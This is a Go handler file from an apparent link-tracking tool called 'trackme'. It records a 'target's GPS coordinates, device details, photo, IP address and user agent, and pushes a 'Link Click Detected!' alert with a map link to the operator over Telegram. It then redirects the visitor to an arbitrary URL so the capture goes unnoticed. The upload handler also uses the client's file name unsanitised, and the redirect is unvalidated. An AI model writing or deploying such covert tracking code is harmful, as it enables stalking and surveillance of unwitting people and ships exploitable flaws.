package handlers

import (
	"fmt"
	"io"
	"log"
	"time"

	"github.com/aws/aws-sdk-go-v2/service/s3"
	"github.com/michaelwp/trackme/internal/config"
	"github.com/michaelwp/trackme/internal/services"

	"github.com/gofiber/fiber/v3"
	"github.com/michaelwp/trackme/internal/models"
	"github.com/michaelwp/trackme/internal/repository"
)

type targetRequest struct {
	Location models.LocationInformation `json:"location" validate:"required"`
	Device   models.DeviceInformation   `json:"device" validate:"required"`
	Photo    models.Photo               `json:"photo"`
}

type LocationHandler interface {
	SaveLocation(c fiber.Ctx) error
	GetLocations(c fiber.Ctx) error
	UploadPhoto(c fiber.Ctx) error
}

type locationHandler struct {
	repository      repository.LocationRepository
	s3Client        *s3.Client
	s3Config        *config.S3Config
	telegramService *services.TelegramService
}

func NewLocationHandler(s3Client *s3.Client, s3Config *config.S3Config) LocationHandler {
	return locationHandler{
		repository:      repository.NewLocationRepository(),
		s3Client:        s3Client,
		s3Config:        s3Config,
		telegramService: services.NewTelegramService(),
	}
}

func (l locationHandler) SaveLocation(c fiber.Ctx) error {
	target := new(targetRequest)

	if err := c.Bind().All(target); err != nil {
		return c.Status(fiber.StatusBadRequest).JSON(fiber.Map{
			"error": "Invalid request body",
		})
	}

	l.TrackClick(c, target.Location.Latitude, target.Location.Longitude)

	locationModel := &models.Target{
		Location:  target.Location,
		Device:    target.Device,
		Photo:     target.Photo,
		Timestamp: time.Now(),
	}

	if err := l.repository.Create(locationModel); err != nil {
		return c.Status(fiber.StatusInternalServerError).JSON(fiber.Map{
			"error": "Failed to save location",
		})
	}

	// Debug: Log the created document ID
	log.Printf("Created new location with ID: %s", locationModel.ID.Hex())

	return c.Status(fiber.StatusCreated).JSON(fiber.Map{
		"id": locationModel.ID.Hex(),
	})
}

func (l locationHandler) UploadPhoto(c fiber.Ctx) error {
	file, err := c.FormFile("photo")
	if err != nil {
		log.Println("error on get photo from form file:", err)
		return c.Status(fiber.StatusBadRequest).JSON(fiber.Map{
			"error": "No file uploaded",
		})
	}

	path := "photos/" + file.Filename

	fileContent, err := file.Open()
	if err != nil {
		log.Println("error on get file content:", err)
		return c.Status(fiber.StatusInternalServerError).JSON(fiber.Map{
			"error": "Failed to open file",
		})
	}
	defer fileContent.Close()

	buffer, err := io.ReadAll(fileContent)
	if err != nil {
		log.Println("error on get buffer from file content:", err)
		return c.Status(fiber.StatusInternalServerError).JSON(fiber.Map{
			"error": "Failed to read file",
		})
	}

	if err := l.s3Config.UploadFile(l.s3Client, path, buffer); err != nil {
		log.Println("error on upload file to S3:", err)
		return c.Status(fiber.StatusInternalServerError).JSON(fiber.Map{
			"error": "Failed to upload file to S3",
		})
	}

	return c.Status(fiber.StatusOK).JSON(fiber.Map{
		"filename": file.Filename,
		"path":     path,
	})
}

func (l locationHandler) GetLocations(c fiber.Ctx) error {
	//locations, err := l.repository.GetAll()
	//if err != nil {
	//	return c.Status(fiber.StatusInternalServerError).JSON(fiber.Map{
	//		"error": "Failed to fetch locations",
	//	})
	//}
	//
	//// Debug: Log all available document IDs
	//log.Printf("Available document IDs in database:")
	//for i, location := range locations {
	//	log.Printf("  [%d] ID: %s", i, location.ID.Hex())
	//}
	//
	//return c.Status(fiber.StatusOK).JSON(fiber.Map{
	//	"locations": locations,
	//})

	targetURL := c.Query("url", "")
	if targetURL == "" {
		targetURL = "https://www.google.com"
	}

	return c.Redirect().To(targetURL)
}

func (l locationHandler) TrackClick(c fiber.Ctx, lat float64, long float64) {
	// Get visitor information
	ip := c.IP()
	userAgent := c.Get("User-Agent")
	referer := c.Get("Referer")
	timestamp := time.Now().Format("2006-01-02 15:04:05")

	// Create a notification message
	message := fmt.Sprintf("🔗 Link Click Detected!\n\n"+
		"Time: %s\n"+
		"IP: %s\n"+
		"User Agent: %s\n"+
		"Referer: %s\n",
		timestamp, ip, userAgent, referer)

	message += fmt.Sprintf("location: https://www.google.com/maps/@%f,%f,15z?entry=ttu&g_ep=EgoyMDI1MDgxOS4wIKXMDSoASAFQAw%%3D%%3D", lat, long)

	// Send Telegram notification
	go func() {
		if err := l.telegramService.SendNotification(message); err != nil {
			fmt.Printf("Error sending Telegram notification: %v\n", err)
		}
	}()
}
